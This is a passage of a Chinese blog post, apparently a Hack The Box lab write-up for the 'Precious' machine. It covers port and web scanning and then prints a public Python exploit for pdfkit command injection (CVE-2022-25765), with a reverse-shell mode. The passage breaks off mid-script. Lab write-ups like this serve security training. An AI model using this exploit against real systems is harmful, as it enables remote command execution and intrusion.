<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  Precious | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  Precious</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-03T10:33:38.623Z" id="date"> 2023-07-03</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-03T13:35:09.882Z" id="updated"> 2023-07-03</time></div></span><br><span>Word Count: <div class="control">4.7k</div></span><br><span>Read Time: <div class="control">26 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/blhx1.png'><img src="/pic/blhx1.png" alt="blhx1"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Hack The Box 上的一台机子，比较简单,里面有个yaml的反序列化漏洞利用。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo nmap -sn 10.10.10.128/24              <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.1<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.2<br>Host is up (0.00018s latency).<br>MAC Address: 00:50:56:EC:CE:9E (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.133<br>Host is up (0.00031s latency).<br>MAC Address: 00:0C:29:42:D4:D0 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.254<br>Host is up (0.00028s latency).<br>MAC Address: 00:50:56:E9:4F:0B (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.128<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 1.95 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 10.10.10.133<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.133<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:42:D4:D0 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.29 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo nmap -sV -sT -O -p22,80 10.10.10.133                    <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.133<br>Host is up (0.00060s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>MAC Address: 00:0C:29:42:D4:D0 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.12 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo nmap --script=vuln 10.10.10.133     <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.133<br>Host is up (0.00050s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:42:D4:D0 (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 73.44 seconds</span><br></code></pre></td></tr></table></figure>

<p>总体来说没特别多信息，主要信息就是这台机子开了22和80端口，且OS大概率是Ubuntu。</p>
<p>在跑<code>nmap</code>的同时，也用<code>nikto</code>扫一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo nikto -h http://10.10.10.133<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.10.133<br>+ Target Hostname:    10.10.10.133<br>+ Target Port:        80<br>+ Start Time:         2023-07-03 17:09:49 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: nginx/1.18.0 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ Root page / redirects to: http://precious.htb/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).<br>+ 8046 requests: 0 error(s) and 3 item(s) reported on remote host<br>+ End Time:           2023-07-03 17:10:15 (GMT8) (26 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>发现其中说明访问ip会跳转到对应网址，所以我们要把ip对应的网址加入host中，免得网页显示出什么问题。就直接<code>vim /etc/hosts</code>,在里面插入一行<code>10.10.10.133 http://precious.htb/</code>就可以正常访问了。</p>
<p>也挂了下dirb，也没发现其他的网页。</p>
<p><code>whatweb</code>看一下网页基于的技术栈。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ sudo whatweb http://precious.htb                                               <br>http://precious.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.17], IP[10.10.10.133], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.17], X-XSS-Protection[1; mode=block], nginx[1.18.0]<br></code></pre></td></tr></table></figure>

<p>可以看到网页是基于Phusion Passenger搭建的。在exp-db上搜索相关的exp没发现可以用的。那就先看看网页吧。</p>
<h2 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h2><p>打开网页：</p>
<p class='item-img' data-src='/pic/assets/a72b044f7d6797bb45dca7b8ae051a7d.png'><img src="/pic/assets/a72b044f7d6797bb45dca7b8ae051a7d.png" alt="a72b044f7d6797bb45dca7b8ae051a7d"></p>
<p>发现是个可以把网页页面转换成PDF的网站。</p>
<p>如果我们尝试文件包含或者加<code>&#39;</code>,都会显示不是正确的URL。看来不用往这方面考虑了。</p>
<p>那我们就正常试试效果。我们就输本身的网址试试。</p>
<p class='item-img' data-src='/pic/assets/01af65a30158f2e9094eb2565f984850.png'><img src="/pic/assets/01af65a30158f2e9094eb2565f984850.png" alt="01af65a30158f2e9094eb2565f984850"></p>
<p>发现会跳转打开一个新窗口并展示页面转换成pdf的结果。</p>
<p>结果符合我们的预期，但是中间这个跳转的过程发生了什么，是调用了API还是做了什么值得我们研究一下。不管怎样，多打开控制台看看是好习惯。</p>
<p>我可以发现控制台报了很多警告，其中还有一条很重要的信息。</p>
<p class='item-img' data-src='/pic/assets/005aa573ddf11b84deef1f83d3725915.png'><img src="/pic/assets/005aa573ddf11b84deef1f83d3725915.png" alt="005aa573ddf11b84deef1f83d3725915"></p>
<p><code>Generated by pdfkit v0.8.6</code>这条生成信息说明了网页是调用<code>pdfkit</code>工具实现转pdf操作的，这里甚至还提供了版本信息，那我们直接查下exp-db看看有无可用的exp。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Precious/workSpace]<br>└─$ searchsploit pdfkit  <br>----------------------------------------------------------- ---------------------------------<br> Exploit Title                                             |  Path<br>----------------------------------------------------------- ---------------------------------<br>pdfkit v0.8.7.2 - Command Injection                        | ruby/local/51293.py<br>----------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>

<p>我们可以发现还真有。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="pdfkit"><a href="#pdfkit" class="headerlink" title="pdfkit"></a>pdfkit</h3><p>我们直接<code>-m</code>拷贝到当前目录并查看其实现。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Exploit Title: pdfkit v0.8.7.2 - Command Injection</span><br><span class="hljs-comment"># Date: 02/23/2023</span><br><span class="hljs-comment"># Exploit Author: UNICORD (NicPWNs &amp; Dev-Yeoj)</span><br><span class="hljs-comment"># Vendor Homepage: https://pdfkit.org/</span><br><span class="hljs-comment"># Software Link: https://github.com/pdfkit/pdfkit</span><br><span class="hljs-comment"># Version: 0.0.0-0.8.7.2</span><br><span class="hljs-comment"># Tested on: pdfkit 0.8.6</span><br><span class="hljs-comment"># CVE: CVE-2022–25765</span><br><span class="hljs-comment"># Source: https://github.com/UNICORDev/exploit-CVE-2022-25765</span><br><span class="hljs-comment"># Description: The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.</span><br><br><span class="hljs-comment"># Imports</span><br>import time<br>import sys<br>import requests<br>from urllib.parse import quote<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">color:</span><br>    red = <span class="hljs-string">&#x27;\033[91m&#x27;</span><br>    gold = <span class="hljs-string">&#x27;\033[93m&#x27;</span><br>    blue = <span class="hljs-string">&#x27;\033[36m&#x27;</span><br>    green = <span class="hljs-string">&#x27;\033[92m&#x27;</span><br>    no = <span class="hljs-string">&#x27;\033[0m&#x27;</span><br><br><br><span class="hljs-comment"># Print UNICORD ASCII Art</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">UNICORD_ASCII</span>():<br>    print(rf<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">&#123;color.red&#125;        _ __,~~~&#123;color.gold&#125;/&#123;color.red&#125;_&#123;color.no&#125;        &#123;color.blue&#125;__  ___  _______________  ___  ___&#123;color.no&#125;</span><br><span class="hljs-string">&#123;color.red&#125;    ,~~`( )_( )-\|       &#123;color.blue&#125;/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \&#123;color.no&#125;</span><br><span class="hljs-string">&#123;color.red&#125;        |/|  `--.       &#123;color.blue&#125;/ /_/ /    // // /__/ /_/ / , _/ // /&#123;color.no&#125;</span><br><span class="hljs-string">&#123;color.green&#125;_V__v___&#123;color.red&#125;!&#123;color.green&#125;_&#123;color.red&#125;!&#123;color.green&#125;__&#123;color.red&#125;!&#123;color.green&#125;_____V____&#123;color.blue&#125;\____/_/|_/___/\___/\____/_/|_/____/&#123;color.green&#125;....&#123;color.no&#125;</span><br><span class="hljs-string">    &quot;</span><span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-comment"># Print exploit help menu</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">help</span>():<br>    print(r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection</span><br><span class="hljs-string"></span><br><span class="hljs-string">Usage:</span><br><span class="hljs-string">  python3 exploit-CVE-2022–25765.py -c &lt;command&gt;</span><br><span class="hljs-string">  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt;</span><br><span class="hljs-string">  python3 exploit-CVE-2022–25765.py -c &lt;command&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]</span><br><span class="hljs-string">  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]</span><br><span class="hljs-string">  python3 exploit-CVE-2022–25765.py -h</span><br><span class="hljs-string"></span><br><span class="hljs-string">Options:</span><br><span class="hljs-string">  -c    Custom command mode. Provide command to generate custom payload with.</span><br><span class="hljs-string">  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.</span><br><span class="hljs-string">  -w    URL of website running vulnerable pdfkit. (Optional)</span><br><span class="hljs-string">  -p    POST parameter on website running vulnerable pdfkit. (Optional)</span><br><span class="hljs-string">  -h    Show this help menu.</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>)<br>    exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loading</span>(<span class="hljs-params">spins</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">spinning_cursor</span>():<br>        <span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:<br>            <span class="hljs-keyword">for</span> cursor <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;|/-\\&#x27;</span>:<br>                <span class="hljs-keyword">yield</span> cursor<br><br>    spinner = spinning_cursor()<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(spins):<br>        sys.stdout.write(<span class="hljs-keyword">next</span>(spinner))<br>        sys.stdout.flush()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        sys.stdout.write(<span class="hljs-string">&#x27;\b&#x27;</span>)<br><br><br><span class="hljs-comment"># Run the exploit</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">payload, exploitMode, postArg</span>):<br><br>    <span class="hljs-variable constant_">UNICORD_ASCII</span>()<br><br>    print(f<span class="hljs-string">&quot;&#123;color.blue&#125;UNICORD: &#123;color.red&#125;Exploit for CVE-2022–25765 (pdfkit) - Command Injection&#123;color.no&#125;&quot;</span>)<br>    loading(<span class="hljs-number">15</span>)<br>    print(f<span class="hljs-string">&quot;&#123;color.blue&#125;OPTIONS: &#123;color.gold&#125;&#123;modes[exploitMode]&#125;&#123;color.no&#125;&quot;</span>)<br>    print(f<span class="hljs-string">&quot;&#123;color.blue&#125;PAYLOAD: &#123;color.gold&#125;&quot;</span> + payload + f<span class="hljs-string">&quot;&#123;color.no&#125;&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;web&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-symbol">exploitMode:</span><br>        <span class="hljs-keyword">if</span> exploitMode == <span class="hljs-string">&quot;webcommand&quot;</span>:<br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Wrap custom command in \&quot;quotes\&quot; if it has spaces.&#123;color.no&#125;&quot;</span>)<br>        <span class="hljs-symbol">else:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;LOCALIP: &#123;color.gold&#125;&#123;listenIP&#125;:&#123;listenPort&#125;&#123;color.no&#125;&quot;</span>)<br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Be sure to start a local listener on the above IP and port. \&quot;nc -lnvp &#123;listenPort&#125;\&quot;.&#123;color.no&#125;&quot;</span>)<br>        print(f<span class="hljs-string">&quot;&#123;color.blue&#125;WEBSITE: &#123;color.gold&#125;&#123;website&#125;&#123;color.no&#125;&quot;</span>)<br>        print(f<span class="hljs-string">&quot;&#123;color.blue&#125;POSTARG: &#123;color.gold&#125;&#123;postArg&#125;&#123;color.no&#125;&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;http&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-symbol">website:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Make sure website has schema! Like \&quot;http://\&quot;.&#123;color.no&#125;&quot;</span>)<br>            exit()<br>        postArg = postArg + <span class="hljs-string">&quot;=&quot;</span> + quote(payload, safe=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-symbol">try:</span><br>            response = requests.post(website, postArg)<br>        <span class="hljs-symbol">except:</span><br>            print(<br>                f<span class="hljs-string">&quot;&#123;color.blue&#125;ERRORED: &#123;color.red&#125;Couldn&#x27;t connect to website!&#123;color.no&#125;&quot;</span>)<br>            exit()<br>        loading(<span class="hljs-number">15</span>)<br>        print(f<span class="hljs-string">&quot;&#123;color.blue&#125;EXPLOIT: &#123;color.gold&#125;Payload sent to website!&#123;color.no&#125;&quot;</span>)<br>        loading(<span class="hljs-number">15</span>)<br>        print(f<span class="hljs-string">&quot;&#123;color.blue&#125;SUCCESS: &#123;color.green&#125;Exploit performed action.&#123;color.no&#125;&quot;</span>)<br>    elif exploitMode == <span class="hljs-string">&quot;command&quot;</span>:<br>        print(f<span class="hljs-string">&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Wrap custom command in \&quot;quotes\&quot; if it has spaces.&#123;color.no&#125;&quot;</span>)<br>        loading(<span class="hljs-number">15</span>)<br>        print(<br>            f<span class="hljs-string">&quot;&#123;color.blue&#125;EXPLOIT: &#123;color.green&#125;Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.&#123;color.no&#125;&quot;</span>)<br>    elif exploitMode == <span class="hljs-string">&quot;shell&quot;</span>:<br>        print(f<span class="hljs-string">&quot;&#123;color.blue&#125;LOCALIP: &#123;color.gold&#125;&#123;listenIP&#125;:&#123;listenPort&#125;&#123;color.no&#125;&quot;</span>)<br>        print(f<span class="hljs-string">&quot;&#123;color.blue&#125;WARNING: &#123;color.gold&#125;Be sure to start a local listener on the above IP and port.&#123;color.no&#125;&quot;</span>)<br>        loading(<span class="hljs-number">15</span>)<br>        print(<br>            f<span class="hljs-string">&quot;&#123;color.blue&#125;EXPLOIT: &#123;color.green&#125;Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.&#123;color.no&#125;&quot;</span>)<br><br>    exit()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    args = [<span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;-w&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>]<br>    modes = &#123;<span class="hljs-string">&#x27;command&#x27;</span>: <span class="hljs-string">&#x27;Custom Command Mode&#x27;</span>,<br>             <span class="hljs-string">&#x27;shell&#x27;</span>: <span class="hljs-string">&#x27;Reverse Shell Mode&#x27;</span>,<br>             <span class="hljs-string">&#x27;webcommand&#x27;</span>: <span class="hljs-string">&#x27;Custom Command Send to Target Website Mode&#x27;</span>,<br>             <span class="hljs-string">&#x27;webshell&#x27;</span>: <span class="hljs-string">&#x27;Reverse Shell Sent to Target Website Mode&#x27;</span>&#125;<br>    postArg = <span class="hljs-string">&quot;url&quot;</span><br><br>    <span class="hljs-keyword">if</span> args[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> sys.<span class="hljs-symbol">argv:</span><br>        help()<br>    elif args[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> sys.argv <span 